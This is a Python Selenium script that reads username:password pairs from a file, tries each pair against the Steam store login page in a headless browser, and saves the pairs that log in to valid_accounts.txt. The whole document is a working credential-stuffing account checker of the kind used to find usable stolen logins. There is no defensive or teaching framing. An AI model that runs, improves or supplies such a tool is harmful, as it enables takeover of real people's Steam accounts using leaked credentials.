from selenium import webdriver
from selenium.webdriver.firefox.options import Options
from selenium.common.exceptions import NoSuchElementException, TimeoutException
import time
import os

# URL of the login page
login_url = "https://store.steampowered.com/login/"


def check_login(username, password):
    # Initialize Firefox options
    options = Options()
    options.headless = True  # Enable headless mode
    options.add_argument('-headless')  # Add additional argument for headless mode
    print("Running in headless mode:", options.headless)  # Confirm headless mode

    # Initialize WebDriver
    driver = webdriver.Firefox(options=options)

    try:
        # Navigate to Steam login page
        driver.get(login_url)
        time.sleep(5)

        # Find the username and password fields
        username_field = driver.find_element("xpath",
                                             "/html/body/div[1]/div[7]/div[6]/div[3]/div[1]/div/div/div/div[2]/div/form/div[1]/input")
        password_field = driver.find_element("xpath",
                                             "/html/body/div[1]/div[7]/div[6]/div[3]/div[1]/div/div/div/div[2]/div/form/div[2]/input")

        # Enter the credentials
        username_field.send_keys(username)
        password_field.send_keys(password)

        # Find the sign-in button and click it
        sign_in_button = driver.find_element("xpath",
                                             "/html/body/div[1]/div[7]/div[6]/div[3]/div[1]/div/div/div/div[2]/div/form/div[4]/button")
        sign_in_button.click()

        # Wait for the login process to complete
        time.sleep(5)

        # Check if login was successful by looking for a specific element (e.g., the account dropdown menu)
        try:
            driver.find_element("xpath", "/html/body/div[1]/div[7]/div[1]/div/div[3]/div/span")
            print(f"Login successful for {username}.")
            return True
        except NoSuchElementException:
            print(f"Login failed for {username}.")
            return False

    except (NoSuchElementException, TimeoutException) as e:
        print(f"An error occurred for {username}: {str(e)}")
        return False

    finally:
        # Ensure the browser is closed
        driver.quit()


def process_accounts():
    # Read the accounts from the accounts.txt file with UTF-8 encoding
    try:
        with open("accounts.txt", "r", encoding="utf-8") as file:
            credentials = file.readlines()
    except FileNotFoundError:
        print("The file 'accounts.txt' was not found.")
        return

    # Load the valid accounts if the file exists
    if os.path.exists("valid_accounts.txt"):
        with open("valid_accounts.txt", "r", encoding="utf-8") as valid_file:
            processed_accounts = set(line.strip() for line in valid_file.readlines())
    else:
        processed_accounts = set()

    total_accounts = len(credentials)  # Get the total number of accounts

    # Iterate over each username:password pair with an index
    for index, credential in enumerate(credentials, start=1):
        parts = credential.strip().split(":")
        if len(parts) != 2:
            print(f"Skipping malformed account entry at line {index}: {credential.strip()}")
            continue

        username, password = parts
        account = f"{username}:{password}"

        # Skip accounts that are already processed
        if account in processed_accounts:
            print(f"Skipping account {index}/{total_accounts}: {username} (already processed)")
            continue

        print(f"Processing account {index}/{total_accounts}: {username}")  # Print current account number and total

        if check_login(username, password):
            # If login was successful, save the account immediately to avoid reprocessing
            with open("valid_accounts.txt", "a", encoding="utf-8") as valid_file:
                valid_file.write(f"{username}:{password}\n")
            print(f"Account {username} saved to valid_accounts.txt")
            processed_accounts.add(account)  # Mark the account as processed

    print("Account processing complete.")



# Start processing accounts
process_accounts()
